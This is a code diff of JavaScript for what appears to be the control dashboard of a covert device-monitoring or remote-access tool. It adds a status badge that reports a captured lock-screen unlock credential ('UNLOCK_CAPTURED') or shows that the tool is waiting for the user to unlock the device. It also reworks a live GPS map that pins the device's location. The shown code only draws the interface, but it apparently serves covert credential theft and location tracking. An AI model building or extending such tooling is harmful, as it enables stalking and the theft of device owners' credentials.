@@ -1313,6 +1313,23 @@ async function checkGhostStatus() {
           elevateAdminBtn.style.background = "rgba(255, 49, 49, 0.05)";
         }
       }
+
+      const watcherBadge = document.getElementById("keyguard-watcher-badge");
+      if (watcherBadge) {
+        if (data.hasCredential) {
+          watcherBadge.style.borderColor = "var(--neon-green)";
+          watcherBadge.style.color = "var(--neon-green)";
+          watcherBadge.style.background = "rgba(57, 255, 20, 0.15)";
+          watcherBadge.style.boxShadow = "0 0 12px rgba(57, 255, 20, 0.3)";
+          watcherBadge.innerHTML = "✔ STATUS: UNLOCK_CAPTURED (" + (data.credentialType || "CREDENTIAL") + ")";
+        } else {
+          watcherBadge.style.borderColor = "#555";
+          watcherBadge.style.color = "#888";
+          watcherBadge.style.background = "rgba(255, 255, 255, 0.03)";
+          watcherBadge.style.boxShadow = "none";
+          watcherBadge.innerHTML = "&#9203; STATUS: WAITING_FOR_USER_UNLOCK";
+        }
+      }
     }
   } catch (err) {}
 }
@@ -1586,11 +1603,11 @@ function renderMap(lat, lon) {
   const mapOverlay = document.getElementById("map-overlay");
   const extMapBtn = document.getElementById("ext-map-btn");
 
-  if (mapFrame && isGpsActive) {
+  if (mapFrame) {
     mapFrame.srcdoc = `<!DOCTYPE html><html><head><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><style>html,body,#map{height:100%;width:100%;margin:0;padding:0;background:#060b10;overflow:hidden;}.leaflet-tile{filter:invert(100%) hue-rotate(180deg) brightness(0.9) contrast(1.3) !important;}.tactical-marker-wrap{position:relative;width:0;height:0;}.radar-ping{position:absolute;top:50%;left:50%;width:44px;height:44px;margin-top:-22px;margin-left:-22px;border:2px solid #00f2ff;border-radius:50%;background:rgba(0,242,255,0.1);box-shadow:0 0 15px #00f2ff;animation:radar 1.8s infinite ease-out;pointer-events:none;}.red-pin{position:absolute;top:50%;left:50%;width:18px;height:18px;margin-top:-9px;margin-left:-9px;background-color:#ff3131;border-radius:50%;border:2px solid #ffffff;box-shadow:0 0 12px #ff3131, 0 0 24px #00f2ff;animation:pin-pulse 1.5s infinite alternate;}@keyframes radar{0%{transform:scale(0.2);opacity:1;}100%{transform:scale(2.2);opacity:0;}}@keyframes pin-pulse{0%{transform:scale(0.95);box-shadow:0 0 10px #ff3131, 0 0 20px #00f2ff;}100%{transform:scale(1.15);box-shadow:0 0 20px #ff3131, 0 0 35px #00f2ff;}}</style></head><body><div id="map"></div><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><script>function loadMap(){if(typeof L==='undefined'){setTimeout(loadMap,100);return;}try{var m=L.map('map',{zoomControl:true}).setView([${lat},${lon}],16);var tileProviders=['https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/{z}/{y}/{x}','https://server.arcgisonline.com/ArcGIS/rest/services/World_Topo_Map/MapServer/tile/{z}/{y}/{x}','https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}'];var providerIdx=0;function tryTileLayer(){if(providerIdx>=tileProviders.length)return;var currentUrl=tileProviders[providerIdx];var layer=L.tileLayer(currentUrl,{maxZoom:19,attribution:'Esri'});layer.on('tileerror',function(){m.removeLayer(layer);providerIdx++;tryTileLayer();});layer.addTo(m);}tryTileLayer();var pinIcon=L.divIcon({className:'custom-tactical-pin',html:'<div class="tactical-marker-wrap"><div class="radar-ping"></div><div class="red-pin"></div></div>',iconSize:[0,0]});L.marker([${lat},${lon}],{icon:pinIcon}).addTo(m);setTimeout(function(){m.invalidateSize();},200);}catch(e){console.error(e);}}if(document.readyState==='complete'){loadMap();}else{window.addEventListener('load',loadMap);}</script></body></html>`;
     mapFrame.style.display = "block";
-    if (mapOverlay) mapOverlay.style.display = "none";
   }
+  if (mapOverlay) mapOverlay.style.display = "none";
   if (extMapBtn) extMapBtn.style.display = "inline-block";
 }
 
@@ -1603,8 +1620,8 @@ function updateCoordDisplay(lat, lon, isLive, errorMsg) {
   let lastLon = "";
   let lastTime = "";
   try {
-    lastLat = (extMapBtn && extMapBtn.dataset.lat) ? extMapBtn.dataset.lat : (localStorage.getItem("last_gps_lat") || (currentLat ? currentLat.toString() : ""));
-    lastLon = (extMapBtn && extMapBtn.dataset.lon) ? extMapBtn.dataset.lon : (localStorage.getItem("last_gps_lon") || (currentLon ? currentLon.toString() : ""));
+    lastLat = localStorage.getItem("last_gps_lat") || (currentLat ? currentLat.toString() : "");
+    lastLon = localStorage.getItem("last_gps_lon") || (currentLon ? currentLon.toString() : "");
     lastTime = localStorage.getItem("last_gps_time") || "";
   } catch(e) {}
 
@@ -1617,12 +1634,8 @@ function updateCoordDisplay(lat, lon, isLive, errorMsg) {
       localStorage.setItem("last_gps_lon", lon);
       localStorage.setItem("last_gps_time", lastTime);
     } catch(e) {}
-    if (extMapBtn) {
-      extMapBtn.dataset.lat = lat;
-      extMapBtn.dataset.lon = lon;
-      extMapBtn.style.display = "inline-block";
-    }
     display.innerHTML = `<span style="color:var(--neon-green); font-weight:bold;">LIVE_FIX: LAT: ${lat} | LON: ${lon}</span>`;
+    if (extMapBtn) extMapBtn.style.display = "inline-block";
   } else if (lastLat && lastLon && lastLat !== "0" && lastLon !== "0") {
     const timeTag = lastTime ? ` (${lastTime})` : "";
     if (extMapBtn) {
